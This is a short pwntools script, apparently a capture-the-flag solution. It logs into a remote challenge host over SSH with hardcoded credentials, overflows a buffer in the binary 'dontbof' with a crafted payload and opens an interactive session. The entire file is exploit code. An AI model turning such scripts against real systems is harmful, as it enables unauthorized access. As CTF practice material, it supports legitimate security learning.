from pwn import *

context.log_level= 'debug'

x = process("./dontbof")


s = ssh(
	user='dontbof',
	host='52.141.22.138',
	port=20103,
	password='1234'
)

x = s.process("./dontbof")

payload = "\x00"*(0x14) + "Hi"

#x.recvuntil(":")
x.recvuntil("Overflow Me :")
x.sendline(payload)
sleep(0.5)
print(x.recv(1024))
x.interactive()